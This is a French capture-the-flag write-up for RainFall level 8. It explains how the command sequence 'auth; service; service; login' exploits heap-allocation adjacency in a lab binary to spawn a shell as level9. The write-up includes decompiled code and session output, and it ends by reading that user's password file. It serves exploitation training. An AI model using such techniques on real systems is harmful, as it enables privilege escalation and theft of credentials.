**Exploit**:

**Commande**:  
```bash
auth ; service; service; login
```

**Explication**:  
Le programme en question est une application en C qui utilise des pointeurs auth et service, initialement mis à NULL. Lors de son exécution, le programme affiche continuellement les adresses actuelles pointées par auth et service. Il comporte plusieurs commandes critiques permettant de manipuler ces adresses :
    auth <arg>: Alloue 4 octets pour auth et copie la chaîne fournie en argument à cette adresse.
    reset: Libère la mémoire allouée à auth.
    service <arg>: Alloue une chaîne pour service en dupliquant la chaîne fournie.
    login: Exécute /bin/sh si le 33ème octet (index 32) de la mémoire allouée à auth est non nul; sinon, affiche un message demandant un mot de passe.

Lorsqu'on lance l'executable, on a : 
level8@RainFall:~$ ./level8 
(nil), (nil)

- En analysant l'exectuable avec ghidra et apres avoir simplifie le code, on peut voir :
    if (strncmp(buffer, "login", 5) == 0)
            {
                if (auth[32] != 0)
                    system("/bin/sh");
                else
                    fwrite("Password:\n", 10, 1, stdout);
    }
Si *auth + 32 est difference de 0, on peut obtenir notre shell
- On execute a nouveau et on peut voir que l'adresse de auth est de 0x804a008: 
    level8@RainFall:~$ ./level8 
    (nil), (nil) 
    auth 
    0x804a008, (nil)
- A chaque fois qu'on va ecrire service, on va allouer de la memoire pour service avec strdup :
    level8@RainFall:~$ ./level8 
    (nil), (nil) 
    auth 
    0x804a008, (nil) 
    service
    0x804a008, 0x804a018
- On peut supposer que les adresse de auth et service se suivent, on a besoin que *auth + 32 ne soit pas vide
    32 = 0x20
    0x804a008 + 0x20 = 0x804a028
- On execute a nouveau service :
    level8@RainFall:~$ ./level8 
    (nil), (nil) 
    auth 
    0x804a008, (nil) 
    service
    0x804a008, 0x804a018 
    service 
    0x804a008, 0x804a028
- On obtient notre shell : 
    level8@RainFall:~$ ./level8 
    (nil), (nil) 
    auth 
    0x804a008, (nil) 
    service
    0x804a008, 0x804a018 
    service 
    0x804a008, 0x804a028 
    login
    $ whoami
    level9
    cat /home/user/level9/.pass